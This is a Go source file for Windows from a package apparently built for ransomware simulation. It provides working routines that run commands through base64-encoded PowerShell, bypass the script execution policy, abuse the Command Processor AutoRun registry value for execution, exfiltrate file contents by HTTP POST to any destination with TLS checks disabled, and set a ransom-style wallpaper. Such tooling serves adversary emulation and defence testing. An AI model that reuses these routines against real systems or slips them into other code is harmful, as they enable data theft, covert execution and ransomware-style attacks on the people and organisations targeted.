//go:build windows

package ransimware

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/mjwhitta/errors"
	"github.com/mjwhitta/win/wininet/http"
)

func executeBat(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var e error
	var o []byte

	// Create bat script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	// Run bat script
	o, e = exec.Command(name).Output()

	// Clean up, if requested
	if clean {
		os.Remove(name)
	}

	// Check for error
	if e != nil {
		return "", errors.Newf("command \"%s\" failed: %w", name, e)
	}

	return strings.TrimSpace(string(o)), nil
}

func executePS1(
	name string,
	cmds []string,
	clean bool,
) (string, error) {
	var e error
	var o []byte
	var old string

	// Create ps1 script
	if e = writeScript(name, cmds); e != nil {
		return "", e
	}

	if clean {
		old, _ = executeShell(
			"powershell",
			[]string{"Get-ExecutionPolicy -Scope CurrentUser"},
		)
	}

	// Allow unsigned scripts to run
	_, e = executeShell(
		"powershell",
		[]string{"Set-ExecutionPolicy -Scope CurrentUser Bypass"},
	)
	if e != nil {
		return "", e
	}

	// Run ps1 script
	o, e = exec.Command("powershell", "-File", name).Output()

	// Clean up, if requested
	if clean {
		os.Remove(name)

		// Restore old policy, or try
		if old != "" {
			executeShell(
				"powershell",
				[]string{
					"Set-ExecutionPolicy -Scope CurrentUser " + old,
				},
			)
		}
	}

	// Check for error
	if e != nil {
		return "", errors.Newf("command \"%s\" failed: %w", name, e)
	}

	return strings.TrimSpace(string(o)), nil
}

func executeRegistry(cmds []string, clean bool) (string, error) {
	var e error
	var found bool
	var k registry.Key
	var o []byte
	var old string
	var out []string

	// Create key
	k, found, e = registry.CreateKey(
		registry.CURRENT_USER,
		filepath.Join("Software", "Microsoft", "Command Processor"),
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if e != nil {
		return "", e
	}

	// Get old value
	if found {
		old, _, _ = k.GetStringValue("AutoRun")
	}

	for _, cmd := range cmds {
		// Set new value
		if e = k.SetStringValue("AutoRun", cmd); e != nil {
			return "", e
		}

		// Run cmd
		o, e = exec.Command("cmd", "/C", "echo off").Output()
		if e != nil {
			return strings.Join(out, "\n"), e
		}

		out = append(out, strings.TrimSpace(string(o)))
	}

	if !clean {
		return strings.Join(out, "\n"), nil
	}

	// Clean up if requested
	if !found {
		// Delete key if not found
		e = registry.DeleteKey(
			registry.CURRENT_USER,
			filepath.Join(
				"Software",
				"Microsoft",
				"Command Processor",
			),
		)
		if e != nil {
			return strings.Join(out, "\n"), e
		}
	} else if old != "" {
		// Restore old value
		if e = k.SetStringValue("AutoRun", old); e != nil {
			return strings.Join(out, "\n"), e
		}
	} else {
		// Delete new value if no old value
		if e = k.DeleteValue("AutoRun"); e != nil {
			return strings.Join(out, "\n"), e
		}
	}

	return strings.Join(out, "\n"), nil
}

// ExecuteScript will run shell commands using the provided method, as
// well as attempt to clean up artifacts, if requested.
func ExecuteScript(
	method string,
	clean bool,
	cmds ...string,
) (string, error) {
	if len(cmds) == 0 {
		return "", nil
	}

	switch method {
	case "b64powershell":
		return executeShell("b64powershell", cmds)
	case "bat":
		return executeBat(cmds[0], cmds[1:], clean)
	case "cmd", "shell":
		return executeShell("cmd", cmds)
	case "powershell":
		return executeShell("powershell", cmds)
	case "ps1":
		return executePS1(cmds[0], cmds[1:], clean)
	case "registry":
		return executeRegistry(cmds, clean)
	default:
		return "", errors.Newf("unsupported method: %s", method)
	}
}

func executeShell(shell string, cmds []string) (string, error) {
	var b64 string
	var e error
	var flag string
	var o []byte
	var out []string
	var tmp string
	var utf8 []byte
	var utf16 []uint16

	switch shell {
	case "b64powershell":
		for _, cmd := range cmds {
			tmp += strings.TrimSpace(cmd)

			if !strings.HasSuffix(tmp, "{") &&
				!strings.HasSuffix(tmp, ";") {
				tmp += ";"
			}
		}

		if utf16, e = windows.UTF16FromString(tmp); e != nil {
			e = errors.Newf(
				"failed to convert %s to Windows type: %w",
				tmp,
				e,
			)
			return "", e
		}

		utf8 = make([]byte, 2*len(utf16)-2)
		for i, b16 := range utf16[:len(utf16)-1] {
			binary.LittleEndian.PutUint16(utf8[2*i:2*(i+1)], b16)
		}

		b64 = base64.StdEncoding.EncodeToString(utf8)
		cmds = []string{b64}
		flag = "-e"
		shell = "powershell"
	case "cmd":
		flag = "/C"
	case "powershell":
		flag = "-c"
	default:
		return "", errors.Newf("unsupported shell: %s", shell)
	}

	// Run cmds
	for _, cmd := range cmds {
		if o, e = exec.Command(shell, flag, cmd).Output(); e != nil {
			e = errors.Newf("command \"%s\" failed: %w", cmd, e)
			return strings.Join(out, "\n"), e
		}

		if len(o) > 0 {
			out = append(out, strings.TrimSpace(string(o)))
		}
	}

	return strings.Join(out, "\n"), nil
}

// HTTPExfil will return a function pointer to an ExfilFunc that
// exfils via HTTP POST requests with the specified headers.
func HTTPExfil(
	dst string,
	headers map[string]string,
) (ExfilFunc, error) {
	var f ExfilFunc = func(path string, b []byte) error {
		var b64 string
		var data []byte
		var e error
		var n int
		var r *http.Request
		var stream = bytes.NewReader(b)
		var tmp [4 * 1024 * 1024]byte

		http.DefaultClient.TLSClientConfig.InsecureSkipVerify = true
		http.DefaultClient.Timeout = time.Second

		for {
			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
				return nil
			} else if e != nil {
				return errors.Newf("failed to read data: %w", e)
			}

			// Create request
			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
			data = []byte(path + " " + b64)
			r = http.NewRequest(http.MethodPost, dst, data)
			r.Headers = headers

			// Send Message and ignore response or errors
			http.DefaultClient.Do(r)
		}
	}

	return f, nil
}

// WallpaperNotify is a NotifyFunc that sets the background wallpaper.
func WallpaperNotify(
	img string,
	png []byte,
	fit string,
	clean bool,
) NotifyFunc {
	return func() error {
		var e error
		var f *os.File
		var k registry.Key
		var spiSetdeskwallpaper uintptr = 0x0014
		var spifSendchange uintptr = 0x0002
		var spifUpdateinifile uintptr = 0x0001
		var user32 *windows.LazyDLL

		// Write PNG to file
		if f, e = os.Create(img); e != nil {
			return errors.Newf("failed to create %s: %w", img, e)
		}

		if _, e = f.Write(png); e != nil {
			return errors.Newf("failed to write to %s: %w", img, e)
		}

		f.Close()

		// Get key
		k, _, e = registry.CreateKey(
			registry.CURRENT_USER,
			filepath.Join("Control Panel", "Desktop"),
			registry.SET_VALUE,
		)
		if e != nil {
			return errors.Newf("failed to get registry key: %w", e)
		}

		// Set wallpaper
		if e = k.SetStringValue("WallPaper", img); e != nil {
			return errors.Newf("failed to set wallpaper key: %w", e)
		}

		// Set style
		if e = k.SetStringValue("WallpaperStyle", fit); e != nil {
			return errors.Newf("failed to set style key: %w", e)
		}

		// Set tiling
		switch fit {
		case DesktopTile:
			e = k.SetStringValue("TileWallpaper", "1")
		default:
			e = k.SetStringValue("TileWallpaper", "0")
		}
		if e != nil {
			return errors.Newf("failed to set tile key: %w", e)
		}

		// Change background with Windows API, or try
		user32 = windows.NewLazySystemDLL("User32")
		user32.NewProc("SystemParametersInfoA").Call(
			spiSetdeskwallpaper,
			0,
			uintptr(unsafe.Pointer(&[]byte(img)[0])),
			spifSendchange|spifUpdateinifile,
		)

		// Remove image file, if requested
		if clean {
			os.Remove(img)
		}

		return nil
	}
}

func writeScript(name string, cmds []string) error {
	var e error
	var f *os.File

	// Open script
	if f, e = os.Create(name); e != nil {
		return errors.Newf("failed to create %s: %w", name, e)
	}
	defer f.Close()

	// Write script
	for _, cmd := range cmds {
		if _, e = f.WriteString(cmd + "\n"); e != nil {
			return errors.Newf("failed to write to %s: %w", name, e)
		}
	}

	return nil
}
